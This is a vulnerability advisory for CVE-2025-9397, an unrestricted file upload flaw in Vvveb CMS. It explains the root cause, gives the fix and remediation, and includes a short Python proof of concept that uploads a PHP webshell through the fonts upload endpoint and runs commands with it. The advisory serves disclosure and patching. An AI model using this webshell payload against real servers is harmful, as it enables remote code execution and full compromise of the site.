# CVE-2025-9397 Vulnerability Report

## Overview

- **CVE ID**: CVE-2025-9397
- **CWE**: CWE-434 (Unrestricted Upload of File with Dangerous Type)
- **Affected Software**: givanz Vvveb CMS
- **Affected Versions**: 1.0.0 - 1.0.7.2
- **Fixed Version**: 1.0.7.3
- **CVSS Score**: 9.8 (Critical)

## Vulnerability Description

An unrestricted file upload vulnerability exists in Vvveb CMS versions up to 1.0.7.2. The vulnerability is located in the `/system/traits/media.php` file which provides file upload functionality through the Media trait.

The Fonts controller (`/admin/controller/theme/fonts.php`) and DigitalAsset controller (`/admin/controller/product/digital-asset.php`) use the Media trait but do not define the `uploadDenyExtensions` property. This allows authenticated administrators to upload arbitrary files including PHP scripts, leading to Remote Code Execution (RCE).

## Root Cause Analysis

In version 1.0.7.2, the Media trait's `upload()` method checks for denied file extensions:

```php
if (isset($this->uploadDenyExtensions) && in_array($extension, $this->uploadDenyExtensions)) {
    $message .= __('File type not allowed!');
    $success = false;
}
```

However, controllers using this trait (like Fonts and DigitalAsset) do not define `uploadDenyExtensions`, so `isset($this->uploadDenyExtensions)` returns `false` and the file type check is skipped entirely.

In the fixed version (1.0.7.3), the Media trait defines default denied extensions:

```php
protected $uploadDenyExtensions = ['php', 'svg', 'js', 'exe'];
protected $uploadDenyMime = ['image/svg', 'image/svg+xml', 'application/javascript', 'application/x-msdownload'];
```

## Attack Vector

1. Attacker authenticates as an admin user
2. Sends a multipart POST request to `/admin/index.php?module=theme/fonts&action=upload`
3. Uploads a PHP webshell via the `files[]` parameter
4. Accesses the uploaded file at `/fonts/<filename>.php`
5. Achieves Remote Code Execution

## Proof of Concept

```python
# Upload PHP webshell to Fonts controller
upload_url = f"{base_url}/admin/index.php?module=theme/fonts&action=upload"
files = {'files[]': ('shell.php', b'<?php system($_GET["cmd"]); ?>', 'application/octet-stream')}
data = {'mediaPath': '/'}
response = session.post(upload_url, files=files, data=data)
# Access: GET /fonts/shell.php?cmd=id
```

## Impact

- **Remote Code Execution**: Attackers can execute arbitrary system commands
- **Full System Compromise**: Potential to gain complete control of the web server
- **Data Breach**: Access to sensitive data stored on the server
- **Lateral Movement**: Potential pivot point for attacking internal networks

## Remediation

1. Upgrade to Vvveb CMS version 1.0.7.3 or later
2. If upgrade is not immediately possible, manually add `uploadDenyExtensions` to affected controllers
3. Implement server-level restrictions on PHP execution in upload directories

## Timeline

- **Disclosure**: Public exploit available
- **Fix Released**: Version 1.0.7.3 (October 6, 2025)

## References

- https://github.com/givanz/Vvveb
- https://nvd.nist.gov/vuln/detail/CVE-2025-9397
